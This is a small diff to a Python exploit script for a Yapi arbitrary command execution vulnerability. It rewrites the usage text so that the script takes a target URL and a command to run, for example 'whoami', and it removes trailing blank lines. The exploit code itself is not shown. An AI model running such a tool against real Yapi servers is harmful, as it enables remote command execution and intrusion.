@@ -150,7 +150,7 @@ if __name__ == '__main__':
         Yapi任意命令执行漏洞  By j2ekim
     ===========================================
     """)
-    usage = ("Usage: exp.py -u [--url] -s [--shell] -f [--file] target\n"
+    usage = ("Usage: exp.py -u [--url] -c [--command] \n"
              "exp.py -u http://127.0.0.1 -c whoami\n")
     parser = OptionParser(usage=usage)
     parser.add_option('-u', '--url', dest='url', help='help')
@@ -167,6 +167,3 @@ if __name__ == '__main__':
         url = do_url(url)
         # print(url)
         main(url,command)
-
-
-
